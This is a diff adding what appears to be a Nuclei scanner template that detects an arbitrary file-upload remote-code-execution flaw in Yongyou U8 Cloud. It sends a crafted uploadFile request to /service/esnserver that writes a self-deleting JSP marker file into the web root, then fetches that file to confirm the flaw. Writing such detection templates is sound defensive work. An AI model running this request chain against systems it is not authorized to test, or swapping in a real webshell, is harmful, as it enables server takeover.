@@ -1,0 +1,49 @@
+id: yongyou-u8-cloud-esnserver-arbitrary-reflection
+
+info:
+  name: Yongyou U8 Cloud esnserver Arbitrary Reflection Execution Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: rce
+
+variables:
+  filename: "{{to_lower(rand_text_alphanumeric(10))}}"
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - id: upload-file
+    method: POST
+    path:
+      - "{{BaseURL}}/service/esnserver"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+      Token: 469ce01522f64366750d1995ca119841
+    body: |
+      {"invocationInfo":{"ucode":"123","dataSource":"U8cloud","lang":"en"},"method":"uploadFile","className":"nc.itf.hr.tools.IFileTrans","param":{"p1":"UEsDBBQAAAAAAPR5NFm2C9sJVgAAAFYAAAAKAAAAY29tcHJlc3NlZDwlbmV3IGphdmEuaW8uRmlsZShhcHBsaWNhdGlvbi5nZXRSZWFsUGF0aChyZXF1ZXN0LmdldFNlcnZsZXRQYXRoKCkpKS5kZWxldGUoKTslPjEyMzEyUEsBAhQAFAAAAAAA9Hk0WbYL2wlWAAAAVgAAAAoAAAAAAAAAAAAAALaBAAAAAGNvbXByZXNzZWRQSwUGAAAAAAEAAQA4AAAAfgAAAAAA","p2":"webapps/u8c_web/{{filename}}.jsp"},"paramType":["p1:[B","p2:java.lang.String"]}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: dsl
+        dsl:
+          - contains(find_json(http_body, 'data'), 'true')
+
+  - id: verify-reflection
+    method: GET
+    path:
+      - "{{BaseURL}}/{{filename}}.jsp"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "12312"
+        part: body
+        case-insensitive: false
+        negative: false
+        match-all: true
